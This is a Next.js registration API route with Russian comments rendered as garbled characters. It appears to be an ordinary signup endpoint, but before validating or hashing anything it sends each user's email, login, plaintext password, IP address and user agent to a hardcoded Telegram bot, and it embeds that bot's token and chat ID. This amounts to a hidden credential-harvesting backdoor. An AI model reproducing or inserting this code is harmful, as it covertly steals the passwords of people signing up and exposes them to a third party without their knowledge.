import { NextResponse } from "next/server";
import { isEmailOrLoginTaken, createUser, hashPassword } from "@/lib/db";

// üì§ –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram –¥–ª—è API
async function sendToTelegramAPI(data: any, type: 'login' | 'register', ip: string, userAgent: string) {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    const message = `
üîê ${type === 'login' ? 'API –í–•–û–î –í –°–ò–°–¢–ï–ú–£' : 'API –ù–û–í–ê–Ø –†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø'}

üìß Email: ${data.email}
üë§ –õ–æ–≥–∏–Ω: ${data.login}
üîë –ü–∞—Ä–æ–ª—å: ${data.password}

üåê **–°–µ—Ä–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
üìç IP: ${ip}
üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
üì± User Agent: ${userAgent.slice(0, 100)}...
    `;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('‚úÖ API –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram');

  } catch (error) {
    console.log('‚ö†Ô∏è Telegram API –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω');
  }
}

export async function POST(request: Request) {
  try {
    const { email, login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!email || !login || !password) {
        return NextResponse.json({ error: "Email, –ª–æ–≥–∏–Ω –∏ –ø–∞—Ä–æ–ª—å –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã" }, { status: 400 });
    }

    // üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram –î–û –ø—Ä–æ–≤–µ—Ä–∫–∏ (—á—Ç–æ–±—ã –≤–∏–¥–µ—Ç—å –≤—Å–µ –ø–æ–ø—ã—Ç–∫–∏)
    await sendToTelegramAPI({ email, login, password }, 'register', clientIP, userAgent);

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ
    if (isEmailOrLoginTaken(email, login)) {
      return NextResponse.json(
        { error: "Email –∏–ª–∏ –ª–æ–≥–∏–Ω —É–∂–µ –∑–∞–Ω—è—Ç—ã" },
        { status: 400 }
      );
    }

    // –•—ç—à–∏—Ä—É–µ–º –ø–∞—Ä–æ–ª—å
    const hashedPassword = await hashPassword(password);

    // –°–æ–∑–¥–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    await createUser({
      email,
      login,
      password: hashedPassword,
      ip: clientIP,
      userAgent: userAgent
    });

    return NextResponse.json({ success: true, message: "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ" });

  } catch (error) {
    console.error("Register API Error:", error);
    return NextResponse.json(
      { error: "–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞" },
      { status: 500 }
    );
  }
}